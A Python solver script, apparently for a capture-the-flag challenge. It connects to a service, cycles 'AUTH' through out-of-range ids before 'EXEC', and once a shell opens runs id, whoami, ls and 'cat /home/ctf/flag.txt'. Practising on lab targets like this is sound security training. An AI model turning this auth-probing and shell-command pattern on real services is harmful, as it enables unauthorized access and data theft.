#!/usr/bin/env python3
import os
import socket
import time
import sys


def recv_all(sock: socket.socket, timeout: float = 0.6) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(65535)
            if not data:
                break
            chunks.append(data)
            if len(data) < 65535:
                break
    except Exception:
        pass
    return b"".join(chunks)


def send_line(sock: socket.socket, line: str, delay_s: float = 0.25) -> bytes:
    if not line.endswith("\n"):
        line += "\n"
    sock.sendall(line.encode())
    time.sleep(delay_s)
    return recv_all(sock, 0.8)


def main() -> None:
    ip = os.environ.get("IP")
    port_str = os.environ.get("PORT")
    if len(sys.argv) >= 3:
        ip = sys.argv[1]
        port_str = sys.argv[2]
    if not ip or not port_str:
        print("Falta IP/PORT", file=sys.stderr)
        sys.exit(2)
    port = int(port_str)

    with socket.create_connection((ip, port), timeout=5) as s:
        _ = recv_all(s, 0.3)
        send_line(s, "RLDB")
        test_ids = [0, -1] + list(range(1, 11)) + [11]
        for tid in test_ids:
            send_line(s, f"AUTH {tid}")
            out = send_line(s, "EXEC").decode("utf-8", errors="ignore")
            print(f"-- AUTH {tid} --")
            print(out)
            # Si abre shell, lanzar comandos básicos y salir
            if "$ ./bin/sh" in out or "You can run commands now" in out:
                for cmd in ["id", "whoami", "uname -a", "pwd", "ls -la", "cat /home/ctf/flag.txt", "exit"]:
                    s.sendall((cmd + "\n").encode())
                    time.sleep(0.4)
                    data = recv_all(s, 0.8)
                    try:
                        print(data.decode("utf-8", errors="ignore"))
                    except Exception:
                        print(repr(data))
                break


if __name__ == "__main__":
    main()

